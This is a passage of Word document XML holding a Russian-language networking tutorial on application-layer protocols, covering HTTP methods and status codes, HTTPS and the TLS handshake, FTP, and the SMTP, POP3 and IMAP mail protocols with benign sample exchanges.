        <w:t>8.4.6. Протоколы прикладного уровня: что делают приложения</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Прикладной уровень</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это самый верхний уровень стека TCP/IP. Здесь работают протоколы, с которыми взаимодействуют пользователи и приложения.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>HTTP (HyperText Transfer Protocol) — протокол веба</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>HTTP</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это протокол передачи гипертекста, используемый для загрузки веб-страниц.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Характеристики</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Порт**: 80</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Транспорт**: TCP</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Режим**: запрос-ответ (клиент отправляет запрос → сервер отвечает)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Методы HTTP</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (самые важные):</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| Метод | Описание | Пример |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|-------|----------|--------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>GET</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Получить ресурс | `GET /index.html` — загрузить главную страницу |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>POST</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Отправить данные | Отправка формы (логин, пароль) |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>PUT</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Обновить ресурс | Загрузить файл на сервер |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>DELETE</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Удалить ресурс | Удалить файл |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>HEAD</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Получить только заголовки | Проверить, изменился ли файл |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример HTTP-запроса</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>GET /search?q=tcp HTTP/1.1</w:t>
        <w:br/>
        <w:t>Host: google.com</w:t>
        <w:br/>
        <w:t>User-Agent: Mozilla/5.0</w:t>
        <w:br/>
        <w:t>Accept: text/html</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Расшифровка</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`GET /search?q=tcp` — получить страницу поиска с запросом "tcp"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`HTTP/1.1` — версия протокола</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`Host: google.com` — доменное имя (обязательно!)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`User-Agent` — информация о браузере</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`Accept` — какие типы данных клиент понимает</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример HTTP-ответа</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>HTTP/1.1 200 OK</w:t>
        <w:br/>
        <w:t>Content-Type: text/html</w:t>
        <w:br/>
        <w:t>Content-Length: 1234</w:t>
        <w:br/>
        <w:br/>
        <w:t>&lt;html&gt;</w:t>
        <w:br/>
        <w:t>&lt;body&gt;Результаты поиска...&lt;/body&gt;</w:t>
        <w:br/>
        <w:t>&lt;/html&gt;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Расшифровка</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`HTTP/1.1 200 OK` — статус ответа (200 = успешно)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`Content-Type: text/html` — тип данных (HTML)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`Content-Length: 1234` — размер ответа (1234 байта)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Пустая строка, затем **тело ответа** (HTML-код)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Статус-коды HTTP</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (выучи наизусть!):</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| Код | Описание | Пример |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|-----|----------|--------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>200 OK</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Успешно | Страница загрузилась |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>301 Moved Permanently</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Редирект (постоянный) | Сайт переехал на новый домен |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>302 Found</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Редирект (временный) | Временная страница |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>400 Bad Request</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Ошибка в запросе | Неправильный синтаксис |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>401 Unauthorized</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Требуется авторизация | Нужен логин/пароль |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>403 Forbidden</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Доступ запрещён | У тебя нет прав |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>404 Not Found</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Страница не найдена | Битая ссылка |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>500 Internal Server Error</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Ошибка сервера | Баг в коде сервера |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>502 Bad Gateway</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Шлюз не отвечает | Сервер за прокси недоступен |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>503 Service Unavailable</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Сервис недоступен | Перегрузка сервера |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проблема HTTP</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Данные передаются </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>в открытом виде</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (без шифрования). Любой, кто перехватит трафик, увидит всё (пароли, личные данные).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>HTTPS (HTTP Secure) — безопасный HTTP</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>HTTPS</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это HTTP поверх </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>TLS/SSL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (Transport Layer Security / Secure Sockets Layer).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Характеристики</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Порт**: 443</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Транспорт**: TCP</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Шифрование**: TLS 1.2 / TLS 1.3</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что делает HTTPS</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Шифрование**: данные зашифрованы (перехватчик увидит только мусор)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Аутентификация**: проверка, что сервер действительно тот, за кого себя выдаёт (SSL-сертификат)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Целостность**: данные не были изменены по пути</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Процесс установки HTTPS-соединения</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (TLS Handshake):</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Клиент → Сервер: ClientHello**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   "Привет! Вот список алгоритмов шифрования, которые я поддерживаю."</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Сервер → Клиент: ServerHello + Сертификат**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   "Привет! Я выбрал алгоритм AES-256. Вот мой SSL-сертификат (подтверждает, что я настоящий google.com)."</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Клиент проверяет сертификат**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   "Сертификат подписан доверенным центром (CA)? Да? Окей, тебе можно верить."</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Обмен ключами** (Diffie-Hellman или RSA)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   Клиент и сервер договариваются о </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>сеансовом ключе</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (session key) для шифрования.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Готово!** Дальше весь трафик шифруется этим ключом.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Время установки HTTPS-соединения</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Больше, чем HTTP (из-за TLS Handshake). Обычно </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>+1-2 RTT</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: RTT = 100 мс.  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>HTTP: TCP handshake (150 мс) + HTTP-запрос (100 мс) = **250 мс**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>HTTPS: TCP handshake (150 мс) + TLS handshake (200 мс) + HTTP-запрос (100 мс) = **450 мс**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вывод</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: HTTPS медленнее, но </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>безопаснее</w:t>
      </w:r>
      <w:r>
        <w:t>. Сейчас почти все сайты используют HTTPS (Google даже наказывает HTTP-сайты в поиске).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>FTP (File Transfer Protocol) — передача файлов</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>FTP</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это протокол для передачи файлов между клиентом и сервером.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Характеристики</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Порт**: 21 (команды), 20 (данные)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Транспорт**: TCP</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Проблема**: Данные передаются **в открытом виде** (логин, пароль, файлы)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Два канала</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Командный канал** (порт 21): отправка команд (`LIST`, `RETR`, `STOR`)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Канал данных** (порт 20): передача файлов</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Режимы FTP</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Active mode**: сервер подключается к клиенту (проблемы с NAT и фаерволами)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Passive mode**: клиент подключается к серверу (работает везде)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Альтернативы FTP</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**SFTP (SSH File Transfer Protocol)**: передача файлов поверх SSH (шифрование)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**FTPS (FTP Secure)**: FTP поверх TLS/SSL (аналог HTTPS)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вердикт</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Обычный FTP — устарел и небезопасен. Используй </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>SFTP</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>SMTP, POP3, IMAP — протоколы почты</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>SMTP (Simple Mail Transfer Protocol) — отправка почты</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>SMTP</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это протокол для </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>отправки</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> почты от клиента к серверу или между серверами.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Характеристики</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Порт**: 25 (между серверами), 587 (от клиента к серверу, с аутентификацией)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Транспорт**: TCP</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример SMTP-сессии</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>HELO mail.example.com</w:t>
        <w:br/>
        <w:t>MAIL FROM:&lt;sender@example.com&gt;</w:t>
        <w:br/>
        <w:t>RCPT TO:&lt;recipient@example.com&gt;</w:t>
        <w:br/>
        <w:t>DATA</w:t>
        <w:br/>
        <w:t>Subject: Hello!</w:t>
        <w:br/>
        <w:br/>
        <w:t>This is the email body.</w:t>
        <w:br/>
        <w:t>.</w:t>
        <w:br/>
        <w:t>QUIT</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проблема SMTP</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Не поддерживает шифрование (изначально). Сейчас используют </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>STARTTLS</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (шифрование поверх SMTP).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>POP3 (Post Office Protocol v3) — получение почты (скачивание)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>POP3</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это протокол для </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>скачивания</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> почты с сервера на клиент.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Характеристики</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Порт**: 110 (незащищённый), 995 (с TLS)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Транспорт**: TCP</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Как работает</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Клиент подключается к серверу</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Скачивает все письма</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Удаляет их с сервера** (обычно)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проблема</w:t>
      </w:r>
      <w:r>
        <w:t>: Письма удаляются с сервера → если ты проверяешь почту с двух устройств (компьютер + телефон), письма будут только на одном.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>IMAP (Internet Message Access Protocol) — получение почты (доступ к серверу)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>IMAP</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это протокол для </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>работы с почтой на сервере</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (письма остаются на сервере).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Характеристики</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Порт**: 143 (незащищённый), 993 (с TLS)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Транспорт**: TCP</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Как работает</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Клиент подключается к серверу</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Синхронизирует** письма (скачивает заголовки, но не тела писем)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Письма остаются на сервере</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
